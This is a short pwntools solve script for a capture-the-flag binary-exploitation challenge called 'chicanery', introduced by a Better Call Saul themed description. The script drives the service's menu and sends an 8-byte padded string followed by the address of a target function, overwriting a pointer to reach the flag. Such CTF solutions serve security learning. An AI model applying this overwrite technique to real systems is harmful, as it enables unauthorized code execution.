# As Jimmy's date with the state bar committee arrives, 
# he and Kim set in motion a series of surprises for Chuck, and you, Mr. Babineaux, are here to help.
# Jimmy has one simple task for you: 
# bump into his brother and sneak a fully charged battery on his breast pocket.


#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4004

elf = ELF("./dist/chicanery")

r = remote(RHOST, RPORT)
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", b"pen".ljust(8, b"\x00") + p64(elf.sym.chicanery))
r.sendlineafter(b"> ", b"1")
r.info("Receiving success message...")
r.recvuntil(b"You, you have to stop him! You have to --!!\n\n")
r.success(r.recvline().decode())


